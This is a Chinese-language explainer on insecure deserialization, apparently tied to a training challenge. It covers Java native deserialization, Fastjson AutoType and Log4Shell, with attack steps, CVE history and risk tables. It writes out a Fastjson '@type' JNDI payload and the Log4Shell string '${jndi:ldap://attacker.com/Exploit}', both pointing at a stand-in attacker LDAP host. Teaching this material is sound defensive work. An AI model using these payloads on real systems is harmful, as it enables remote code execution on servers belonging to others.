# 不安全的反序列化 — 漏洞原理

## 什么是不安全的反序列化？

不安全的反序列化（Insecure Deserialization）是指应用程序在将外部数据反序列化为对象时，未对数据内容进行充分校验，导致攻击者可以构造恶意序列化数据，在反序列化过程中触发任意代码执行。这是OWASP Top 10中的高危漏洞。

不安全反序列化的核心问题：**应用程序将不可信的数据反序列化为对象，且反序列化过程中会自动调用对象的方法（如 readObject()、setter方法），攻击者可利用这些"钩子"执行恶意代码。**

---

## 一、Java原生反序列化

### 漏洞成因

Java的 `ObjectInputStream.readObject()` 在反序列化时会自动调用对象的 `readObject()` 方法。如果应用中存在可被利用的"Gadget Chain"（如 `VulnerableTask.readObject()` 会自动执行 `command` 字段），攻击者可以构造包含恶意命令的序列化对象，反序列化时触发RCE。

**攻击流程**：

```
1. 发现反序列化入口（接受Base64编码的Java序列化数据）
2. 识别可用Gadget类（如 VulnerableTask）
3. 构造恶意序列化对象（设置 command="id"）
4. Base64编码后提交
5. 服务端 readObject() → 自动调用 readObject() → 执行 command
```

### 真实案例

2015年，Apache Commons Collections的反序列化漏洞（CVE-2015-4852）被公开，影响了WebLogic、JBoss、WebSphere等众多中间件，成为Java安全史上影响最广的漏洞之一。

### 风险等级

| 维度 | 评级 |
|------|------|
| 攻击难度 | 中（需要理解Java序列化协议和Gadget Chain） |
| 影响范围 | 极高（可执行任意系统命令） |
| 利用条件 | 存在反序列化入口 + 可用Gadget类 |

## 二、Fastjson反序列化

### 漏洞成因

Fastjson的 `@type` 字段允许指定反序列化的目标类。Fastjson 1.2.24及以下版本默认开启AutoType功能，会自动实例化 `@type` 指定的类并调用其setter方法。攻击者可以通过 `@type` 指向包含危险setter的类（如 `JdbcRowSetImpl`），利用setter调用链实现JNDI注入，加载远程恶意类实现RCE。

**攻击流程**：

```
1. 发现Fastjson解析入口（接受JSON字符串）
2. 识别Fastjson版本（1.2.24以下有AutoType默认开启）
3. 构造恶意JSON：{"@type":"com.madrabbit.challenge.deser.FastjsonGadget","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}
4. Fastjson实例化Gadget类 → 调用setDataSourceName() → 调用setAutoCommit(true)
5. setAutoCommit() 触发 JNDI lookup → 加载远程恶意类 → RCE
```

### 真实案例

2017-2019年间，Fastjson多个版本爆发反序列化漏洞（CVE-2017-18349等），大量使用Fastjson的Java应用被攻击，包括多个知名互联网公司。

### 风险等级

| 维度 | 评级 |
|------|------|
| 攻击难度 | 中（需要了解Fastjson AutoType机制） |
| 影响范围 | 极高（可执行任意代码） |
| 利用条件 | 使用Fastjson 1.2.24以下版本 |

## 三、Log4Shell

### 漏洞成因

Log4j2 2.14.1及以下版本在处理日志消息时，会解析 `${jndi:ldap://...}` 等lookup表达式。当用户输入被记录到日志中时，如果包含JNDI lookup表达式，Log4j2会执行JNDI查找，加载远程恶意类，导致RCE。

**攻击流程**：

```
1. 发现使用Log4j2的应用（版本 <= 2.14.1）
2. 找到用户输入被记录到日志的位置
3. 构造恶意输入：${jndi:ldap://attacker.com/Exploit}
4. 应用将输入记入日志 → Log4j2解析 ${jndi:...} → JNDI查找
5. 从攻击者控制的LDAP服务器加载恶意类 → RCE
```

### 真实案例

2021年12月，Log4Shell（CVE-2021-44228）被公开，影响了全球数百万使用Log4j2的Java应用，被认为是互联网历史上影响最广泛的安全漏洞之一。苹果iCloud、亚马逊AWS、Minecraft等多个知名服务受到影响。

### 风险等级

| 维度 | 评级 |
|------|------|
| 攻击难度 | 低（只需构造JNDI表达式） |
| 影响范围 | 极高（可执行任意代码） |
| 利用条件 | 使用Log4j2 <= 2.14.1 且用户输入被记录到日志 |
